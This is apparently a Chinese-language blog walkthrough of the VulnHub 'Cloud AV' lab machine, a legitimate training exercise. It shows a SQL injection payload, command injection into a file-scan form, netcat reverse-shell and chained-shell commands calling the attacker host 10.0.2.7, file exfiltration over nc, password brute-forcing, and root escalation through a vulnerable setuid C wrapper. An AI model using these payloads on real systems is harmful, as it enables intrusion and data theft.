> 靶机环境介绍
+ [Easy cloudantivirus 下载地址](https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/)
+ 难度等级 <font color=green>容易</font> （思路 / 技巧）

背景: 是一个云防病毒扫描服务！目前处于测试阶段

目标：渗透该服务，找出漏洞并提权

**所用技术栈：**
+ 端口扫描
+ WEB侦查
+ SQL注入
+ 命令注入
+ NC串联
+ 密码爆破
+ 代码分析
+ 本地提权

攻击机信息: IP 地址 `10.0.2.7`

![20220430_2056.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/8956f9ead9fe75a7a0659b4f58f4e5ec.png)

---

## 主机发现与信息收集

> arp-scan 主要在kali等主机里才有,而arping 这个工具在大多的 Linux 发行版都存在

```bash
for i in $(seq 1 254); do sudo arping -c 2 10.0.2.$i; done;
```

![20220430_1950.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/81873ed2871b1b9c728d9da4b232d871.png)

发现目标主机的 IP 地址为 10.0.2.6

端口扫描

```bash
nmap -p- 10.0.2.6
```

![20220430_1952.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/c1df027dea39699f2155bdf7e64c207a.png)

服务版本和端口开放服务扫描:

```bash
nmap -p22,8080 -sV 10.0.2.6
```
![20220430_1954.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/d7a4cdefffa5babc5a21227a96171f33.png)
发现其开放的 8080 是由一个 python 运行的 web 服务,这时我们先访问一下这个服务,发现这边需要一个邀请码。

![20220430_1957.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/2863d8f025af7036299e90d71e52827d.png)


## SQL 注入
当遇见表单,一般来说需要进行一个基本的探测,如把所有的键盘上能输入的字符,符号都挨个尝试输入一下

我们可以使用 Burp Suit 的 intruder 功能进行探测,先设置浏览器的代理

![20220430_2009.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/07fbc15c8a660998d4345567161f2f75.png)
抓到数据包后,我们可以右键点击 `Send to intruder` 来进行暴力测试

![20220430_2011.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e920d435a78ad4c064b67ddea83355f1.png)

设置 payload <font color="red" face=Monaco size=3> (键盘上能输入的所有符号和字符) </font> 我们可以将这些字符保存在一个文件中,下次进行渗透测试的时候，就能直接使用了

![20220430_2017.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/98e6c06903e6b41bb3fb9c21da372eea.png)

当全部字符都测试一遍之后,发现 字符 `"` 与别的字符产生的效果不一样
![20220430_2019.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/c94a953291be90b6b8d9d7fc603b4630.png)

这时我们在表单中输入 `"` 字符后观察效果,发现网站上有一个类似 python 服务崩溃的错误信息

![20220430_2020.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/23b6ca88fc4658a11a04d377bc321daf.png)


在报错信息下面发现有这么一条 python 语句,很明显,这条语句就是靶机服务器,用来处理前台服务的数据 ( 邀请码 )

![20220430_2023.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/aa4fc70773f9744f7c360fc5f4328b86.png)

```sql
select * from code where password="' + password + '"'
```

当我们输入 `"` 符号时服务器将执行一下代码,我们可以发现后面有一个 `"` 没有被闭合故引发数据库查询错误而报错

```sql
-- 当我们输入 " 时 程序向数据库内的查询语句
select * from code where password="  " "
```

故我们可以构造以下 SQL注入的 payload `"or 1=1 -- `

```sql
-- payload
select * from code where password=" " or 1=1 --   "
```

![20220430_2035.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/02c0dcbfb3e2d05d8214df3e88ca1009.png)

进入之后我们发现该服务器是一个病毒扫描器,这时我们就会想,他的后端是怎么实现的,是否是使用一个 <font color="red" face=Monaco size=3> linux 命令后面接文件名的方式进行扫描</font> 如果不是,那是使用哪种方式?

> 在我们不知道是什么方式时,渗透测试最重要的就是多去尝试,去证明自己的想法和猜想

![20220430_2036.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4154adf82bc01214dc329e7db705db57.png)

测试一下输入当前目录的 `hello` 发现服务器确实给我们返回了一个病毒扫描结果

![20220430_2037.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e620176ca17368fda59362e98fd052cb.png)

假设这边就是运行的 Linux 命令 我们试着构造一个恶意的命令 `hello | id` 来执行 id 命令

![20220430_2045.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/5e43c295ee5bc7e83551ee198f3c58e4.png)

在进行尝试之后，发现这个表单确实有命令注入漏洞
并成功得到了我们预想的结果: id命令的执行结果

![20220430_2045_1.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4b5a97c1a10a3c9a39c1e99e361ea6f8.png)


这时我们就要想办法来获得该靶机的网站权限的shell ( 反弹SHELL )

反弹SHELL 有很多种方式如：
+ 使用 Python 反弹SHELL 如在[Social Network](http://www.zhouhaobusy.com/articles/85)这台靶机就是使用这种方式
+ 使用 nc 反弹SHELL (<font color=red> Python 环境目标靶机不一定会有,而 nc 在大部分 Linux 系统中都会预装</font>)

> 这一次我们使用 nc 来进行反弹shell

首先要确认目标靶机中是否有 nc 命令 我们执行
```bash
hello | which nc
```

![20220430_2055.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7a833cc1a385122b7f907d2170708811.png)
发现目标主机有nc命令
> 通常情况下 nc 有 -e 参数来指定连接成功后的shell

现在攻击机上监听对应想要反弹shell的端口 (4444)

```bash
nc -nvlp 4444
```


如果目标主机nc 版本较新的话,就能通过下面命令成功后在攻击机上获得目标靶机的 shell

```bash
hello | nc 10.0.2.7 4444 -e /bin/sh
```

执行之后发现并没有成功获得shell,说明目标靶机的nc版本并不支持 `-e` 参数

这时我们测试 nc 的基本连接

```bash
hello | nc 10.0.2.7 4444
```
发现攻击机上成功连接到目标靶机发来的 nc 连接请求

![20220430_2106.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/1c5df0c16874eb4fbb6e81df6be1a76b.png)

## <font color=green>NC串联</font>

```bash
hello | nc 10.0.2.7 3333 | /bin/bash | nc 10.0.2.7 4444
```

当我们使用上面这条命令时,我们必须在 攻击机上使用nc监听两个端口( 3333 , 4444 )

![20220430_2118.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/f258b8fba53b959d4258412f2c953b88.png)

第一条命令在3333号端口接收攻击者的命令如 `ls id...`

```bash
nc 10.0.2.7 3333
```
后链接到 `/bin/bash` 进行解析第一条命令所接收的命令 `ls id ...`

最后一条命令将命令解析结果从 4444 端口输送给攻击者,完成了类似与反弹shell的效果

<font color="red" face=Monaco size=3> 运行之后成功获得Shell</font>

![20220430_2119.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/184a2a26e8490324750101ae07c9a0cb.png)


## 密码爆破

查看当前目录的文件,发现有一个 `database.sql` 文件,使用 `file` 命令 查看一下文件格式,发现该文件为 SQLite 数据库文件,结合前面网站的报错,这时我们就有理由怀疑,服务端数据库可能就是使用 SQLite 数据库 

<font color="red" face=Monaco size=3> SQLite 是一个本地的数据库,而它的内容是以一个数据库文件的形式来存储在服务器的某个目录下,所以这个文件很有可能就是数据库里的内容</font>

![20220430_2132.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/fee6f9b5b9a9ef850f9da3688681b835.png)


我们在目标靶机上执行 sqlite 命令 发现并没有任何反应,这说明在目标靶机上可能并没有 sqlite 命令

![20220430_2142.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/90c6e57c78b8b8edcf0f7d47167cc91f.png)

这时我们可以想办法将这个文件上传到攻击机上,使用 kali 里的 sqlite 命令进行查看

这边还是使用 nc 命令进行文件的传输

![20220430_2149.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/4ad2bd91ea9c2b3e1de669b5ac8d9a02.png)

在攻击机中我们运行 `sqlite3` 命令

<font color="green" face=Monaco size=3>基本sqlite 命令</font>
```bash
# 导入对应的数据库文件
.open db.sql
# 查看所导入的数据库文件
.database
# 查看数据库文件内的内容
.dump
```

![20220430_2158.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/5b40eb10f4ebb840a90a9980f07d13b6.png)

查看该数据库文件发现是关于密码相关的数据库插入语句,这时候我们就应该想是否靶机上有账号的密码就在这些密码里面


所以我们可以进一步查看一下 系统中 passwd 文件来发现靶机中有哪些账号,从而进行密码的暴力破解

![20220430_2159.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7f7b3a068bc99bef342dc9281b971624.png)
发现该文件中有好多没有登入权限和系统用户,而一般这些用户并没有什么用,如果加入到我们要暴力破解的字典里的话，还会影响我们破解的效率

故我们使用 `cat /etc/passwd | grep /bin/bash` 来筛选出有登入shell的用户

![20220430_2201.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/d23f92e390aba74a860934c0aa8cd2b5.png)
以这两个信息来构建用户名字典和密码字典来对靶机的用户进行暴力破解

![20220430_2206.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7aa28341b6fe21101dccd91bb7a4dd6e.png)

<font color="orange" face=Monaco size=4> 但遗憾的是我们并没有通过这种方式获取到靶机上有效用户的账号和密码</font>

> 在渗透测试的过程中我们经常会遇到这种情况，当这种方式失败之后，我们应该换种方式去突破!



就比如在 SQL注入这一步(也就是最开始邀请码那步) 有很多种方式进行突破,既然是网页的输入框那我们就可以进行 <font color="red" face=Monaco size=3> 弱口令的尝试和密码的暴力破解等方式来进行突破 </font> 

我这边就使用了2019 年 Top 100 的弱口令字典进行尝试,发现成功获得邀请码 `password` 通过这种方式也能成功突破这个障碍.

![20220430_2255.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/e868076cb4be3874180f589f24f7a2f1.png)

## 本地提权
> 这时候我们就要去寻找另外的方式来提权.

我们遍历一下目录,退出当前目录到其父目录,发现有一个`update_cloudav` 文件,并且该文件具有 sid 位 其所属组也是root ,这时候就应该敏感起来,审计一下 `update_cloudav.c`

```c
#include <stdio.h>

int main(int argc, char *argv[])
{
char *freshclam="/usr/bin/freshclam";

if (argc < 2){
printf("This tool lets you update antivirus rules\nPlease supply command line arguments for freshclam\n");
return 1;
}

char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2);
sprintf(command, "%s %s", freshclam, argv[1]);
setgid(0);
setuid(0);
system(command);
return 0;
}
```
发现这边明显有一个命令执行漏洞,因为它就是传一个参数进去然后和 `freshclam` 这个命令进行拼接,既然是命令,那我们是否可以使用管道等方式执行我们想要执行的代码呢?

我们可以使用上面提到的NC串联的方式来获取root权限的shell
```bash
./update_cloudav "foo | nc 10.0.2.7 5555 | /bin/bash | nc 10.0.2.7 6666"

```

![20220430_2231.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/f8ea08f9714a1012ef42191cd8cf42a7.png)

同样的操作我们只需要在攻击机中使用nc监听对应端口即可

发现我们成功获得root权限的shell
![20220430_2232.png](http://zhouhao-blog.oss-cn-shanghai.aliyuncs.com/articles/7cf6c9241d05e13cc1ba8382717be55f.png)

<font color="green" face=Monaco size=4> 至此我们对这台靶机的渗透测试已完成!!!</font>





